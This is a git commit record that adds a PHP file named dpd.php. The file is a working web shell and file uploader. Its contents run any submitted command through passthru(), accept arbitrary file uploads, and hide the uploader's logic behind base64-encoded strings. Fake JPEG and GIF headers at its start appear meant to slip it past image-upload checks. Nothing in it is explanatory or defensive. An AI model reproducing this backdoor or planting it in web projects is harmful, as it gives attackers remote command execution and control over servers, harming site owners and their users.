0c719d1e9750f7c6b16d163f77bf31a0e127a47c
Scorpion-Dz <76604491+scorpiondz0@users.noreply.github.com>
2023-01-27 16:44:06 -0400

    Create dpd.php

---
+++ dpd.php
@@ -0,0 +1,23 @@
+ÿØÿà
+<form action="" method="post">
+Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
+</form>
+Output:<br />
+<pre><?php passthru($_POST['cmd'], $result); ?></pre>
+
+GIF89;aGIF89;aGIF89;a
+<?php ?>
+<!DOCTYPE html>
+<html>
+<head>
+<title>Welcome</title>
+</head>
+<body><h1>Scorpiondz Uploader</h1>
+<form enctype='multipart/form-data' action='' method='POST'>
+<p>DeathShop Uploaded</p>
+<input type='file' name='uploaded_file'></input><br />
+<input type='submit' value='Upload'></input>
+</form>
+</body>
+</html>
+<?PHP if(!empty($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')])){$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=base64_decode('Li8=');$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485.basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]);if(move_uploaded_file($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485)){echo base64_decode('VGhlIGZpbGUg').basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]).base64_decode('IGhhcyBiZWVuIHVwbG9hZGVk');}else{echo base64_decode('VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiE=');}}?>
